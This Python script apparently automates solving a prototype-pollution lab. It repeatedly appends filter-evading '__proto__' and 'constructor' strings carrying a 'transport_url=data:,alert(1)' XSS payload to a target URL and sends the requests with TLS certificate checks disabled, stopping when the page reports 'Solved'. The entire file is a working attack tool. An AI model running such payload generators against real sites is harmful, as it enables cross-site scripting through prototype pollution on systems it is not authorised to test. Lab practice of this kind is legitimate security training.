from rich.console import Console
from rich.text import Text
from PIL import Image
import typer
import urllib3
import warnings
from selenium import webdriver

# Disabilita tutti i warning
warnings.filterwarnings("ignore")
def pretty_print(url):
    text = Text()
    print(""">=>>=>       >===>      >=>       >=>         >=> >=======> >====>           >=>      >=>      >=>
>=>    >=>   >=>    >=>   >=>        >=>       >=>  >=>       >=>   >=>        >=>      >=>      >=>
 >=>       >=>        >=> >=>         >=>     >=>   >=>       >=>    >=>       >=>      >=>      >=>
   >=>     >=>        >=> >=>          >=>   >=>    >=====>   >=>    >=>       >>       >>       >> 
      >=>  >=>        >=> >=>           >=> >=>     >=>       >=>    >=>       >>       >>       >> 
>=>    >=>   >=>     >=>  >=>            >===>      >=>       >=>   >=>                             
  >=>>=>       >===>      >=======>       >=>       >=======> >====>           >=>      >=>      >=>
                                                                                                    """)
    text.append(f"This is the malicious payload {url}", style="bold magenta")
    return text
def main(url: str,number_of_times: int,file_output:str="payload"):
    c=Console()
    http = urllib3.PoolManager(cert_reqs='CERT_NONE', assert_hostname=False)
    evilString = "__proto__"
    evilString2 = "constructor"
    a = False
    for i in range(0,number_of_times):
        evilString = "__pro" + evilString + "to__"
        evilString += "[transport_url]=data:,alert(1);"
        url = url + "?"+evilString
        response = http.request('GET', url)
        response = response.data.decode('utf-8')
            #print(response)
        if "Solved" in response:
            c.print(pretty_print(url))
            a = True
            break
        evilString = evilString.replace("[transport_url]=data:,alert(1);","")
            #file.write("\n")
    if not a:
        for i in range(0,number_of_times):
            evilString2 = "const"+evilString2+"ructor"
            evilString2 += "[transport_url]=data:,alert(1);"
            url = url + "?" + evilString2
            response = http.request('GET', url)
            # Stampa la risposta
            # print(response.data.decode('utf-8'))
            response = response.data.decode('utf-8')
            if "Solved" in response:
                c.print(pretty_print(url))
                stop = True
                break
            evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")


if __name__ == "__main__":
    typer.run(main)
